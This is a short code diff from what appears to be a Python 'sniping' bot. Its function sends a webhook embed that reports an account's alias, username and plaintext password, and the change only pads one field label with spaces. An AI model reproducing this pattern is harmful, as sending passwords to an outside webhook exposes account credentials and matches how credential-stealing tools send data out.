@@ -86,7 +86,7 @@ async def send_successful_webhook(event):
     embed = {
         "title": "Sniping Success",
         "fields": [
-            {"name": "Name", "value": event['alias'], "inline": False},
+            {"name": "Name                   ", "value": event['alias'], "inline": False},
             {"name": "Username", "value": event['username'], "inline": True},
             {"name": "Password", "value": event['password'], "inline": True},
         ],
